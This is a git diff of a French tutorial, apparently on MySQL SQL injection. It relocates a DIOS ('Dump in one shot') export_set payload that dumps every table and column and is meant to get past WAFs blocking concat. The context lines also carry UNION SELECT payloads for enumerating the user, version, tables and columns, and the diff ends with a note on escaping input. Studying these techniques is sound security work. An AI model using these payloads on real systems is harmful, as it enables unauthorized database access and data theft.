@@ -172,16 +172,6 @@ On peut aussi utiliser la commande ``GROUP BY``. Elle est utilisée pour grouper
 • A partir de 2 sélections il n'y a plus d'erreur, on peut donc utiliser ``UNION SELECT`` pour avoir notre point d'entrée.<br/><br/>
 ![image](https://user-images.githubusercontent.com/74382279/159136155-c4f63ffb-a4d8-45bc-9f03-789b74edb976.png)
 <br/><br/>
-• Si on remplace la deuxième sélection par une commande ``DIOS`` (Dump in one shot). Ce DIOS  utiliser est utilise contre les WAF qui bloquent concat.<br/><br/>
-```sql
-(SELECT export_set(5,@:=0,(SELECT count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))
-```
-<br/><br/>
-![image](https://user-images.githubusercontent.com/74382279/159718662-cfeb07b5-a53f-42b4-87d4-bea8b6cde76b.png)
-<br/><br/>
-Si on formatte la requête ça donne ça:<br/>
-![image](https://user-images.githubusercontent.com/74382279/159136320-3bdbb668-65bc-4d2b-9354-0f686ef566b1.png)
-<br/>
 • Maintenant si je veux afficher la version de la BDD MySQL, l'username et l'hostname de la session MySQL et le nom de la BDD. J'exécute la requête suivante:<br/>
 ```sql
 UNION SELECT NULL,CONCAT_WS(" | ",user(),version(),database())--+-
@@ -201,7 +191,16 @@ UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema=d
 UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users';
 ```
 • Si ``'`` est filtré vous pouvez encoder users en hex et past le résultat avec le préfixe ``0x``.
-
+• Si on remplace la deuxième sélection par une commande ``DIOS`` (Dump in one shot) on peut retrieve toutes les tables et colonnes de la ``SGBD``. Ce ``DIOS``  utiliser est utilise contre les ``WAF`` qui bloquent ``concat``.<br/><br/>
+```sql
+(SELECT export_set(5,@:=0,(SELECT count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))
+```
+<br/><br/>
+![image](https://user-images.githubusercontent.com/74382279/159718662-cfeb07b5-a53f-42b4-87d4-bea8b6cde76b.png)
+<br/><br/>
+Si on formatte la requête ça donne ça:<br/><br/>
+![image](https://user-images.githubusercontent.com/74382279/159136320-3bdbb668-65bc-4d2b-9354-0f686ef566b1.png)
+<br/><br/>
 # Eviter
 • Le paramètre id est sanitized par ``mysqli_real_escape_string()``. Dans son style procédural cette fonction est utilisée pour créer une chaîne SQL valide qui pourra être utilisée dans une requête SQL. La chaîne de caractères string est encodée pour produire une chaîne ``SQL escaped``, en tenant compte du jeu de caractères courant de la connexion.<br/><br/>
 
